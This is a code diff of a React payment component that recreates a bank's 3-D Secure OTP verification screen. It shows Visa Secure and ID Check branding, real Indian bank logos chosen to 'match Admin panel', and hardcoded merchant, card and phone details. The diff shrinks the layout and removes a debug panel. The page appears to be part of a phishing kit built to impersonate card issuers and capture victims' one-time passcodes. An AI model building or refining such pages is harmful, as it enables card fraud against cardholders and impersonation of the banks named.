@@ -26,14 +26,28 @@ const Payment = () => {
 
   // Bank logos data structure - MUST match Admin panel exactly
   const bankLogos = [
-    { name: 'HDFC Bank', logo: 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png' },
-    { name: 'State Bank of India', logo: 'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp' },
-    { name: 'ICICI Bank', logo: 'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png' },
-    { name: 'Axis Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png' },
-    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png' },
-    { name: 'Punjab National Bank', logo: 'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png' },
-    { name: 'Kotak Mahindra Bank', logo: 'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg' },
-    { name: 'Bank of India', logo: 'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png' }
+    { name: 'HDFC Bank', logo: 'https://logolook.net/wp-content/uploads/2021/11/HDFC-Bank-Logo-500x281.png' },
+    { name: 'State Bank of India', logo: 'https://logotyp.us/file/sbi.svg' },
+    { name: 'ICICI Bank', logo: 'https://www.pngkey.com/png/full/223-2237358_icici-bank-india-logo-design-png-transparent-images.png' },
+    { name: 'Axis Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg' },
+    { name: 'Bank of Baroda', logo: 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo-500x281.png' },
+    { name: 'Punjab National Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2023/01/punjab-national-bank-logo-pnb-freelogovectors.net_-400x225.png' },
+    // Kotak Bank - Multiple logos (match one sent from admin)
+    { name: 'Kotak Mahindra Bank', logo: 'https://logos-download.com/wp-content/uploads/2016/06/Kotak_Mahindra_Bank_logo-700x207.png' },
+    { name: 'Kotak Mahindra Bank', logo: 'https://upload.wikimedia.org/wikipedia/en/thumb/3/39/Kotak_Mahindra_Group_logo.svg/578px-Kotak_Mahindra_Group_logo.svg.png?20201116103707' },
+    { name: 'Bank of India', logo: 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-India-logo-500x281.png' },
+    { name: 'Federal Bank', logo: 'https://stickypng.com/wp-content/uploads/2023/07/627ccab31b2e263b45696aa2.png' },
+    { name: 'Union Bank', logo: 'https://cdn.pnggallery.com/wp-content/uploads/union-bank-of-india-logo-01.png' },
+    { name: 'Bank of Maharashtra', logo: 'https://assets.stickpng.com/images/627cc5c91b2e263b45696a8e.png' },
+    // Canara Bank - Multiple logos (match one sent from admin)
+    { name: 'Canara Bank', logo: 'https://cdn.freelogovectors.net/svg10/canara-bank-logo-freelogovectors.net_.svg' },
+    { name: 'Canara Bank', logo: 'https://images.seeklogo.com/logo-png/39/3/canara-bank-logo-png_seeklogo-397142.png' },
+    { name: 'Indian Overseas Bank', logo: 'https://assets.stickpng.com/images/627ccc0c1b2e263b45696aac.png' },
+    { name: 'Indian Bank', logo: 'https://cdn.freelogovectors.net/wp-content/uploads/2019/02/indian-bank-logo.png' },
+    { name: 'IDBI Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/IDBI-Bank-logo-500x281.png' },
+    { name: 'IndusInd Bank', logo: 'https://images.seeklogo.com/logo-png/7/2/indusind-bank-logo-png_seeklogo-71354.png?v=1955232376276339464' },
+    { name: 'Karnataka Bank', logo: 'https://wso2.cachefly.net/wso2/sites/all/images/Karnataka_Bank-logo.png' },
+    { name: 'Yes Bank', logo: 'https://logodownload.org/wp-content/uploads/2019/08/yes-bank-logo-0.png' }
   ];
 
   // Function to get bank name from logo URL
@@ -300,21 +314,21 @@ const Payment = () => {
           {/* OTP Input */}
           {showOtp && !success && !error && (
             <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
-              <div className="relative bg-white rounded-lg shadow-2xl max-w-md w-full mx-auto">
+              <div className="relative bg-white rounded-lg shadow-2xl max-w-xs w-full mx-auto">
                 {/* Top Header with VISA SECURE and Bank Logo */}
-                <div className="bg-white border-b border-gray-200 px-6 py-3 rounded-t-lg">
+                <div className="bg-white border-b border-gray-200 px-3 py-2 rounded-t-lg">
                   <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-2">
-                      <div className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold">
+                    <div className="flex items-center gap-1">
+                      <div className="bg-blue-600 text-white px-1.5 py-0.5 rounded text-xs font-bold">
                         VISA
                       </div>
-                      <span className="text-sm font-medium text-gray-700">SECURE</span>
+                      <span className="text-xs font-medium text-gray-700">SECURE</span>
                     </div>
-                    <div className="flex items-center gap-3">
-                      <span className="text-sm font-medium text-gray-700">ID Check</span>
+                    <div className="flex items-center gap-2">
+                      <span className="text-xs font-medium text-gray-700">ID Check</span>
                       {/* Dynamic Bank Logo */}
                       {bankLogo ? (
-                        <div className="w-12 h-8 bg-white rounded flex items-center justify-center border border-gray-200">
+                        <div className="w-8 h-6 bg-white rounded flex items-center justify-center border border-gray-200">
                           <img 
                             src={bankLogo} 
                             alt={selectedBankName + ' Logo'} 
@@ -330,7 +344,7 @@ const Payment = () => {
                           />
                         </div>
                       ) : (
-                        <div className="w-12 h-8 bg-blue-600 rounded flex items-center justify-center">
+                        <div className="w-8 h-6 bg-blue-600 rounded flex items-center justify-center">
                           <span className="text-white text-xs font-bold">BANK</span>
                         </div>
                       )}
@@ -341,75 +355,29 @@ const Payment = () => {
                 {/* Cancel Button - Top Right */}
                 <button
                   onClick={handleBack}
-                  className="absolute top-4 right-4 text-gray-500 hover:text-gray-700 text-sm font-medium z-10"
+                  className="absolute top-2 right-2 text-gray-500 hover:text-gray-700 text-xs font-medium z-10 px-2 py-1"
                 >
                   cancel
                 </button>
 
-                {/* Header */}
-                <div className="p-6 border-b">
-                  {/* Debug Info */}
-                  <div className="bg-yellow-100 border border-yellow-300 rounded p-2 mb-4 text-xs">
-                    <strong>Debug:</strong> {debugInfo}
-                    <br />
-                    <strong>Bank Logo:</strong> {bankLogo || 'EMPTY'}
-                    <br />
-                    <strong>Bank Name:</strong> {selectedBankName}
-                  </div>
-                  
-                  <div className="flex items-center gap-3 mb-4">
-                    {(() => {
-                      console.log('🔍 Header Logo Debug:', { bankLogo, selectedBankName });
-                      return null;
-                    })()}
-                    {bankLogo ? (
-                      <div className="w-8 h-8 bg-white rounded flex items-center justify-center border">
-                        <img 
-                          src={bankLogo} 
-                          alt={selectedBankName + ' Logo'} 
-                          className="w-6 h-6 object-contain"
-                          onError={(e) => {
-                            console.log('❌ Bank logo failed to load:', bankLogo);
-                            // Fallback to MC icon if bank logo fails to load
-                            e.currentTarget.parentElement!.innerHTML = '<span class="text-orange-500 text-xs font-bold">MC</span>';
-                          }}
-                          onLoad={() => {
-                            console.log('✅ Bank logo loaded successfully:', bankLogo);
-                          }}
-                        />
-                      </div>
-                    ) : (
-                      <div className="w-8 h-8 bg-orange-500 rounded flex items-center justify-center">
-                        <span className="text-white text-xs font-bold">MC</span>
-                      </div>
-                    )}
-                    <span className="font-semibold text-gray-800">ID Check</span>
-                  </div>
-                  
-                  <div className="bg-red-600 text-white text-center py-3 rounded flex items-center justify-center gap-2">
-                    <span className="text-2xl">🏥</span>
-                    <span className="font-bold text-lg">{selectedBankName}</span>
-                  </div>
-                </div>
+
 
                 {/* Merchant Details */}
-                <div className="p-6 border-b bg-gray-50">
-                  <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Merchant Details</h3>
-                  
-                  <div className="space-y-3 text-sm bg-white rounded p-4">
-                    <div className="flex justify-between py-1">
+                <div className="p-3 border-b bg-gray-50">
+                  <div className="space-y-1 text-xs bg-white rounded p-2">
+                    <div className="flex justify-between">
                       <span className="text-gray-600">Merchant Name</span>
-                      <span className="font-medium">XAI LLC</span>
+                      <span className="font-medium">PLURALSIGHT</span>
                     </div>
-                    <div className="flex justify-between py-1">
+                    <div className="flex justify-between">
                       <span className="text-gray-600">Date</span>
-                      <span className="font-medium">{new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })}</span>
+                      <span className="font-medium">{new Date().toLocaleDateString('en-US', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
                     </div>
-                    <div className="flex justify-between py-1">
+                    <div className="flex justify-between">
                       <span className="text-gray-600">Card Number</span>
-                      <span className="font-medium">5522 XXXX XXXX 7167</span>
+                      <span className="font-medium">4234 XXXX XXXX 4989</span>
                     </div>
-                    <div className="flex justify-between py-1">
+                    <div className="flex justify-between">
                       <span className="text-gray-600">Amount</span>
                       <span className="font-medium text-blue-600">
                         {customAmount !== null ? (
@@ -419,7 +387,7 @@ const Payment = () => {
                         )}
                       </span>
                     </div>
-                    <div className="flex justify-between py-1">
+                    <div className="flex justify-between">
                       <span className="text-gray-600">Personal Message</span>
                       <span className="font-medium text-gray-400">-</span>
                     </div>
@@ -427,34 +395,33 @@ const Payment = () => {
                 </div>
 
                 {/* Authentication Section */}
-                <div className="p-6">
-                  <h3 className="text-blue-600 font-semibold text-lg mb-4 text-center">Authenticate Transaction</h3>
+                <div className="p-3">
+                  <h3 className="text-blue-600 font-semibold text-sm mb-2 text-center">Authenticate Transaction</h3>
                   
                   {/* Success Message */}
-                  <div className="bg-green-100 border border-green-300 rounded p-3 mb-4 text-center">
-                    <p className="text-green-700 text-sm">
-                      Successfully sent OTP to your registered mobile number<br />
-                      <span className="font-mono">XXXXXX4939</span>
+                  <div className="bg-green-100 border border-green-300 rounded p-2 mb-3 text-center">
+                    <p className="text-green-700 text-xs">
+                      One time passcode has been sent to your registered<br />
+                      mobile number <span className="font-mono">XX4679</span>
                     </p>
                   </div>
 
                   {/* OTP Error Message */}
                   {error && (
-                    <div className="bg-red-100 border border-red-300 rounded p-3 mb-4 text-center">
-                      <p className="text-red-700 text-sm font-medium">{error}</p>
+                    <div className="bg-red-100 border border-red-300 rounded p-2 mb-3 text-center">
+                      <p className="text-red-700 text-xs font-medium">{error}</p>
                     </div>
                   )}
 
                   {/* Click Here Button */}
-                  <div className="text-center mb-4">
-                    <button className="bg-blue-600 text-white px-6 py-2 rounded text-sm font-medium hover:bg-blue-700 mr-2">
-                      CLICK HERE
+                  <div className="text-center mb-3">
+                    <button className="bg-blue-600 text-white px-3 py-1 rounded text-xs font-medium hover:bg-blue-700">
+                      CLICK HERE For Addon Cardholder OTP
                     </button>
-                    <span className="text-sm text-gray-700">For Addon Cardholder OTP</span>
                   </div>
 
                   {/* OTP Input */}
-                  <div className="mb-4">
+                  <div className="mb-3">
                     <div className="text-center mb-2">
                       <input
                         type="text"
@@ -462,32 +429,26 @@ const Payment = () => {
                         value={otp}
                         onChange={(e) => setOtp(e.target.value)}
                         disabled={isProcessing}
-                        className={`w-full p-3 border border-gray-300 rounded text-center text-lg font-mono ${isProcessing ? 'bg-gray-100' : ''}`}
+                        className={`w-full p-2 border border-gray-300 rounded text-center text-sm font-mono ${isProcessing ? 'bg-gray-100' : ''}`}
                         maxLength={6}
                       />
                     </div>
                     <div className="text-center">
-                      <button className="text-blue-600 text-sm hover:underline">Resend OTP</button>
+                      <button className="text-blue-600 text-xs hover:underline">Resend OTP</button>
                     </div>
                   </div>
 
                   {/* Action Buttons */}
-                  <div className="space-y-3">
-                    <button
-                      onClick={handleBack}
-                      className="w-full border border-gray-300 text-gray-700 py-3 rounded hover:bg-gray-50 font-medium"
-                    >
-                      CANCEL
-                    </button>
+                  <div className="space-y-2">
                     <button
                       onClick={handleOtpSubmit}
                       disabled={otp.length !== 6 || isProcessing}
-                      className={`w-full bg-blue-600 text-white py-3 rounded font-medium hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${isProcessing ? 'relative' : ''}`}
+                      className={`w-full bg-blue-600 text-white py-2 rounded font-medium text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed ${isProcessing ? 'relative' : ''}`}
                     >
                       {isProcessing ? (
                         <>
                           <div className="absolute inset-0 flex items-center justify-center">
-                            <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
+                            <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                           </div>
                           <span className="blur-sm">SUBMIT</span>
                         </>
@@ -495,21 +456,27 @@ const Payment = () => {
                         'SUBMIT'
                       )}
                     </button>
+                    <button
+                      onClick={handleBack}
+                      className="w-full border border-gray-300 text-gray-700 py-2 rounded hover:bg-gray-50 font-medium text-sm"
+                    >
+                      CANCEL
+                    </button>
                   </div>
 
                   {/* Timer */}
-                  <p className="text-center text-xs text-gray-500 mt-4">
-                    This page automatically time out after 1:59 seconds
+                  <p className="text-center text-xs text-gray-500 mt-2">
+                    This page automatically time out after 2.49 minutes
                   </p>
 
                   {/* Powered by */}
-                  <div className="text-center mt-4 pt-4 border-t border-gray-200">
+                  <div className="text-center mt-2 pt-2 border-t border-gray-200">
                     <p className="text-xs text-gray-400 mb-1">Powered by</p>
                     <div className="flex items-center justify-center">
-                      <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center mr-1">
-                        <div className="w-3 h-3 bg-white rounded-full"></div>
+                      <div className="w-4 h-4 bg-green-600 rounded-full flex items-center justify-center mr-1">
+                        <div className="w-2 h-2 bg-white rounded-full"></div>
                       </div>
-                      <span className="text-green-600 font-semibold text-sm">onetap</span>
+                      <span className="text-green-600 font-semibold text-xs">onetap</span>
                     </div>
                   </div>
                 </div>
